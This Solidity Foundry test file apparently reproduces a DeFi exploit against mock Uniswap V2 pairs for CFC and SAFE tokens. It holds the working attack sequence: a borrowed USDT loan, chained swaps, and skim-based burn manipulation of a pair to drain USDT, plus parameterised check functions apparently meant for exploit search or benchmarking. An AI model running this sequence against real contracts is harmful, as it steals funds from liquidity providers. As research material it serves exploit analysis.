// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {CFC} from "./CFC.sol";
import {SAFE} from "./SAFE.sol";
import {USDTCFC} from "./USDTCFC.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract CFCTestBase is Test, BlockLoader {
    USDT usdt;
    SAFE safe;
    CFC cfc;
    UniswapV2Pair safeusdtPair;
    UniswapV2Pair pair;
    USDTCFC usdtcfc;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address safeAddr;
    address cfcAddr;
    address safeusdtPairAddr;
    address pairAddr;
    address usdtcfcAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1686812805;
    uint112 reserve0safeusdtPair = 97465121886619415513006;
    uint112 reserve1safeusdtPair = 489503510554930476393732;
    uint32 blockTimestampLastsafeusdtPair = 1686812772;
    uint256 kLastsafeusdtPair = 47486313626300851357233065832927614284807383768;
    uint256 price0CumulativeLastsafeusdtPair =
        1289939749702297086941886408175762837312088370;
    uint256 price1CumulativeLastsafeusdtPair =
        19813834967984668036434544980989284471792;
    uint112 reserve0pair = 3466655815335789642356;
    uint112 reserve1pair = 100246518127533892079722;
    uint32 blockTimestampLastpair = 1686812598;
    uint256 kLastpair = 548155965428649915691831589164812341266909168;
    uint256 price0CumulativeLastpair =
        210605282325395173002590957195716466715171;
    uint256 price1CumulativeLastpair = 272801197874040290279645040961546599365;
    uint256 totalSupplysafe = 931155431591721766722529;
    uint256 balanceOfsafesafeusdtPair = 97465121886619415513006;
    uint256 balanceOfsafepair = 3466655815335789642356;
    uint256 balanceOfsafeattacker = 0;
    uint256 totalSupplycfc = 3100000000000000000000000;
    uint256 balanceOfcfcsafeusdtPair = 0;
    uint256 balanceOfcfcpair = 100246518127533892079722;
    uint256 balanceOfcfcattacker = 0;
    uint256 totalSupplyusdt = 3379997906401637314353418691;
    uint256 balanceOfusdtsafeusdtPair = 489503510554930476393732;
    uint256 balanceOfusdtpair = 0;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        safe = new SAFE();
        safeAddr = address(safe);
        cfc = new CFC(address(safe));
        cfcAddr = address(cfc);
        usdtcfc = new USDTCFC();
        usdtcfcAddr = address(usdtcfc);
        safeusdtPair = new UniswapV2Pair(
            address(safe),
            address(usdt),
            reserve0safeusdtPair,
            reserve1safeusdtPair,
            blockTimestampLastsafeusdtPair,
            kLastsafeusdtPair,
            price0CumulativeLastsafeusdtPair,
            price1CumulativeLastsafeusdtPair
        );
        safeusdtPairAddr = address(safeusdtPair);
        pair = new UniswapV2Pair(
            address(safe),
            address(cfc),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(safeusdtPair),
            address(pair),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(safeusdtPair), balanceOfusdtsafeusdtPair);
        safe.transfer(address(safeusdtPair), balanceOfsafesafeusdtPair);
        safe.transfer(address(pair), balanceOfsafepair);
        cfc.transfer(address(pair), balanceOfcfcpair);
        cfc.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdt),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(usdt), cfc.decimals());
        emit log_string("");
        emit log_string("Safe Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safe),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safe),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(safe), cfc.decimals());
        emit log_string("");
        emit log_string("Cfc Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(cfc), usdt.decimals());
        queryERC20BalanceDecimals(address(safe), address(cfc), safe.decimals());
        queryERC20BalanceDecimals(address(cfc), address(cfc), cfc.decimals());
        emit log_string("");
        emit log_string("Safeusdtpair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safeusdtPair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safeusdtPair),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(safeusdtPair),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(pair),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(pair), cfc.decimals());
        emit log_string("");
        emit log_string("Usdtcfc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdtcfc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdtcfc),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(usdtcfc),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(attacker),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(attacker),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_safe_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        safe.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_safe_owner(uint256 amount) internal eurus {
        safe.transfer(owner, amount);
    }

    function borrow_cfc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        cfc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_cfc_owner(uint256 amount) internal eurus {
        cfc.transfer(owner, amount);
    }

    function swap_safeusdtPair_attacker_safe_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_safeusdtPair_attacker_usdt_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pair_attacker_safe_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_cfc_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_cfc_pair(uint256 amount) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.skim(attacker);
        amount /= 2;
        cfc.transfer(address(pair), amount);
        pair.skim(attacker);
    }

    function swap_usdtcfc_attacker_usdt_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(pair), safe.balanceOf(attacker));
        pair.swap(
            1,
            pair.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function swap_usdtcfc_attacker_cfc_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
        safeusdtPair.swap(
            0,
            safeusdtPair.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function test_gt() public {
        uint256 amt0 = 0x26764a5ae86ba600000;
        uint256 amt1 = 0x26756c4f7d313000000;
        uint256 amt2 = 0x7764443d11976c0000;
        uint256 amt3 = 0x776417c9d130ec0000;
        uint256 amt4 = 0x83b50e28262a0000000;
        uint256 amt5 = 0x7d1def2bb1219000000;
        uint256 amt6 = 0x1d4c13b2e3b02c00000;
        uint256 amt7 = 0x787dfc48f2690c0000;
        uint256 amt8 = 0x787dfc48f2690c0000;
        uint256 amt9 = 0x2693d5bfdce30200000;
        uint256 amt10 = 0x2693d4e1d177c800000;

        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_cfc_safe(amt6, amt7);
        swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    // function test_gt() public {
    //     vm.startPrank(attacker);
    //     vm.warp(blockTimestamp);
    //     vm.roll(29668034);
    //     emit log_named_uint("amt0", 57 * 1e22);
    //     borrow_usdt_owner(57 * 1e22);
    //     printBalance("After step0 ");
    //     emit log_named_uint("amt1", 13 * 1e21);
    //     emit log_named_uint(
    //         "amt2",
    //         safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
    //     );
    //     swap_usdtcfc_attacker_usdt_cfc(
    //         13 * 1e21,
    //         safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
    //     );
    //     printBalance("After step1 ");
    //     emit log_named_uint("amt3", 36000 ether);
    //     burn_cfc_pair(36000 ether);
    //     printBalance("After step2 ");
    //     emit log_named_uint("amt4", cfc.balanceOf(attacker));
    //     emit log_named_uint(
    //         "amt5",
    //         (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
    //     );
    //     swap_usdtcfc_attacker_cfc_usdt(
    //         cfc.balanceOf(attacker),
    //         (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
    //     );
    //     printBalance("After step3 ");
    //     emit log_named_uint("amt6", 57 * 1e22);
    //     payback_usdt_owner(57 * 1e22);
    //     printBalance("After step4 ");
    //     require(attackGoal(), "Attack failed!");
    //     vm.stopPrank();
    // }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
